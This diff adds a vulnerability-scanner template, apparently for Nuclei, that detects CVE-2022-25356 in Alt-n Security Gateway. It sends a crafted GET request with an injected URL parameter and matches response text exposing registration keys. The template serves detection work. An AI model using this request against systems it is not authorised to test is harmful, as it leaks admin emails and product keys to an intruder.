@@ -1,0 +1,28 @@
+id: cve-2022-25356
+info:
+  name: Alt-n Security Gateway Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Alt-n Security Gateway is vulnerable to an information disclosure flaw that allows attackers to retrieve sensitive information such as protection type (2FA), admin email, and product registration keys by injecting arbitrary XML arguments into the HTTP request URL.
+  reference:
+    - https://www.swascan.com/security-advisory-alt-n-security-gateway/
+  classification:
+    cve-id: CVE-2022-25356
+    cvss-score: 7.5
+
+http:
+  - raw:
+      - |
+        GET /SecurityGateway.dll?view=login&redirect=true&9OW4L7RSDY=1 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Key="
+          - "AllowLostPasswordLink"
